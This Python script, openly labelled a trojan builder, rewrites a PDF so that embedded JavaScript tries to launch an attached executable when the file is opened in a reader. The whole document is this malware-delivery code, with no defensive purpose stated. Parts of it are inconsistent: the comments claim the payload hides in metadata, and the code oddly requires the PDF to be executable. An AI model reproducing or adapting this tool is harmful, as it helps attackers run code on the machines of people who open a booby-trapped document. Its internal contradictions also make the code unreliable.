# create a trojan that attaches to a pdf file
# and executes a shell command when opened
# trojan will be hidden in the metadata of the pdf
# and will be executed when the pdf is opened
# in a pdf reader
# tested with evince and okular
# tested on linux

import sys
import os
import PyPDF2
import argparse

def main():
    parser = argparse.ArgumentParser(description='Create a trojan that attaches to a pdf file and executes a shell command when opened')
    parser.add_argument('-f', '--file', help='File to attach trojan to', required=True)
    parser.add_argument('-c', '--command', help='Command to execute', required=True)
    args = parser.parse_args()
    if not os.path.isfile(args.file):
        print('[-] File does not exist')
        sys.exit(1)
    if not os.access(args.file, os.R_OK):
        print('[-] File is not readable')
        sys.exit(1)
    if not os.access(args.file, os.W_OK):
        print('[-] File is not writable')
        sys.exit(1)
    if not os.access(args.file, os.X_OK):
        print('[-] File is not executable')
        sys.exit(1)
    if not os.path.isfile(args.command):
        print('[-] Command does not exist')
        sys.exit(1)
    if not os.access(args.command, os.R_OK):
        print('[-] Command is not readable')
        sys.exit(1)
    if not os.access(args.command, os.X_OK):
        print('[-] Command is not executable')
        sys.exit(1)
    print('[+] Creating trojan')
    pdf = PyPDF2.PdfFileReader(args.file)
    pdf_writer = PyPDF2.PdfFileWriter()
    for page in range(pdf.getNumPages()):
        pdf_writer.addPage(pdf.getPage(page))
    pdf_writer.addJS('app.alert("Trojan executed");')
    pdf_writer.addJS('this.exportDataObject({cName: "trojan", nLaunch: 2});')
    pdf_writer.addAttachment('trojan', open(args.command, 'rb').read())
    with open(args.file, 'wb') as f:
        pdf_writer.write(f)
    print('[+] Trojan created')

if __name__ == '__main__':
    main()